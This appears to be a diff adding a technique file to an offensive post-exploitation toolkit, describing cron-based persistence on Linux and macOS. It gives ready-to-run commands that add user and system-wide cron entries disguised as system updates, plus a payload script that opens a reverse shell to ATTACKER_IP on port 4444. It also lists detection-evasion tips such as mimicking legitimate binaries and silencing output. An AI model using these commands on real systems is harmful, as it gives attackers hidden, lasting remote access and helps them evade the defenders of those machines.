@@ -1,0 +1,47 @@
+---
+name: cron-persistence
+phase: post
+mitre_ids: [T1053.003]
+opsec_level: 3
+description: Establish persistence on Linux/macOS via cron job or crontab entry
+module: phantom-post
+tools: [crontab, bash]
+prerequisites: [shell_access, linux_or_macos_target]
+---
+# Cron-Based Persistence
+
+## Technique
+Add a cron job that executes a payload or reverse shell at a scheduled
+interval, ensuring re-access if the primary session is lost.
+
+## Commands
+```bash
+# Add a cron job for the current user (runs every 5 minutes)
+(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update >/dev/null 2>&1") | crontab -
+
+# System-wide cron (requires root)
+echo "*/5 * * * * root /tmp/.update >/dev/null 2>&1" >> /etc/cron.d/sysupdate
+
+# Verify the entry was added
+crontab -l
+
+# Payload example: reverse shell script at /tmp/.update
+cat > /tmp/.update << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+EOF
+chmod +x /tmp/.update
+```
+
+## Usage
+1. Drop the payload to a low-visibility path (e.g., /tmp, /var/tmp).
+2. Add the cron entry using the least-privileged method available.
+3. Test the cron fires correctly before relying on it.
+
+## Detection Evasion
+- Name the payload to mimic a legitimate system binary.
+- Use `/dev/null` redirection to suppress output.
+- Prefer `/etc/cron.d/` over user crontab for persistence across user deletion.
+
+## MITRE ATT&CK
+- T1053.003 — Scheduled Task/Job: Cron
